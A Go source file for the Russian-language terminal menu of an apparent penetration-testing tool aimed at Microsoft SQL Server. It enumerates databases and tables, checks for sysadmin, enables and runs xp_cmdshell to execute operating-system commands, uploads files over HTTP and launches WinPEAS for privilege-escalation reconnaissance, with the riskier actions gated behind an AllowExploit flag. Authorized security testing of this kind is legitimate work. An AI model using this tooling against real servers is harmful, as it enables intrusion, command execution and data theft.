package tui

import (
	tea "github.com/charmbracelet/bubbletea"
	"os"
	"path/filepath"
	"strings"
)

var mssqlActions = []string{
	"Текущая база", "Список баз", "Выбрать базу", "Таблицы текущей базы",
	"Столбцы таблицы", "Прочитать строки таблицы", "Количество строк таблицы",
	"Проверить sysadmin", "Состояние xp_cmdshell", "Выполнить команду через xp_cmdshell",
	"Включить xp_cmdshell", "Выключить xp_cmdshell", "SQL-запрос",
	"Передать файл через HTTP (Python)", "Запустить WinPEAS (фоновый процесс)", "Прочитать отчёт WinPEAS / текстовый файл", "Следующие 400 строк отчёта",
}

func (m model) updateMSSQLActions(key string) (tea.Model, tea.Cmd) {
	b := &m.mssqlConsole
	if m.screen == "mssql-xp-confirm" {
		if key == "esc" {
			m.screen = "mssql-actions"
			return m, nil
		}
		if key == "enter" {
			m.screen = "mssql-console"
			query := "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; SELECT name, value_in_use FROM sys.configurations WHERE name='xp_cmdshell'"
			return m.startMSSQL("query", query)
		}
		return m, nil
	}
	switch key {
	case "esc", "q":
		m.screen = "mssql-console"
	case "up", "k":
		b.actionIndex = (b.actionIndex + len(mssqlActions) - 1) % len(mssqlActions)
	case "down", "j":
		b.actionIndex = (b.actionIndex + 1) % len(mssqlActions)
	case "enter":
		m.screen = "mssql-console"
		switch b.actionIndex {
		case 0:
			return m.startMSSQL("query", ":db")
		case 1:
			return m.startMSSQL("audit", "databases")
		case 2:
			m.startInput("mssql-database")
		case 3:
			return m.startMSSQL("query", ":tables")
		case 4:
			m.startInput("mssql-columns")
		case 5:
			m.startInput("mssql-rows")
		case 6:
			m.startInput("mssql-count")
		case 7:
			return m.startMSSQL("read", "SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin")
		case 8:
			return m.startMSSQL("read", "SELECT name, value, value_in_use FROM sys.configurations WHERE name='xp_cmdshell'")
		case 9:
			if !m.current.AllowExploit {
				m.message = "Выполнение команды требует AllowExploit"
				return m, nil
			}
			m.startInput("mssql-command")
		case 10:
			if !m.current.AllowExploit {
				m.message = "Изменение настроек требует AllowExploit"
				return m, nil
			}
			m.screen = "mssql-xp-confirm"
		case 11:
			return m.startMSSQL("query", "EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE; SELECT name, value_in_use FROM sys.configurations WHERE name='xp_cmdshell'")
		case 12:
			m.startInput("mssql-query")
		case 13:
			if !m.current.AllowExploit {
				m.message = "Передача файла требует AllowExploit"
				return m, nil
			}
			m.startInput("mssql-transfer-local")
			m.input = b.transferLocal
			if m.input == "" {
				m.input = bundledWinPEASPath()
			}
		case 14:
			if !m.current.AllowExploit {
				m.message = "Запуск WinPEAS требует AllowExploit"
				return m, nil
			}
			m.startInput("mssql-winpeas")
			m.input = b.winpeasPath
			if m.input == "" {
				m.input = `%TEMP%\winPEAS.exe`
			}
		case 15:
			m.startInput("mssql-report")
			m.input = b.reportPath
			if m.input == "" {
				m.input = `%TEMP%\winPEAS.exe.txt`
			}
		case 16:
			if b.reportPath == "" {
				m.message = "Сначала выбери отчёт"
				return m, nil
			}
			b.reportOffset += 400
			return m.startMSSQL("report", mssqlPowerShellQuery(mssqlReportScript(b.reportPath, b.reportOffset)))
		}
	}
	return m, nil
}

func (m model) viewMSSQLActions(w int) string {
	if m.screen == "mssql-xp-confirm" {
		return m.renderPanel(w, headingStyle.Render("Включить xp_cmdshell?")+"\n\nБудут включены show advanced options и xp_cmdshell на сервере.\nЭто меняет настройки SQL Server и разрешает запуск команд ОС.\n\nEnter — включить · Esc — отмена")
	}
	body := headingStyle.Render("MSSQL — действия") + "\n\n"
	lo, hi := windowRange(m.mssqlConsole.actionIndex, len(mssqlActions), max(1, m.panelRows()-4))
	body += moreLine(lo, true)
	for i := lo; i < hi; i++ {
		body += renderListRow(mssqlActions[i], i == m.mssqlConsole.actionIndex, w)
	}
	body += moreLine(len(mssqlActions)-hi, false)
	body += "\n↑/↓ — выбрать · Enter — выполнить · Esc — результаты"
	return m.renderPanel(w, body)
}

func mssqlCommandQuery(command string) string {
	return "EXEC master.dbo.xp_cmdshell N'" + strings.ReplaceAll(command, "'", "''") + "'"
}

func bundledWinPEASPath() string {
	relative := filepath.Join("tools", "winpeas", "winPEAS.exe")
	candidates := []string{relative}
	if exe, err := os.Executable(); err == nil {
		candidates = append(candidates, filepath.Join(filepath.Dir(exe), relative))
	}
	for _, path := range candidates {
		if info, err := os.Stat(path); err == nil && info.Mode().IsRegular() {
			if abs, err := filepath.Abs(path); err == nil {
				return abs
			}
			return path
		}
	}
	return relative
}
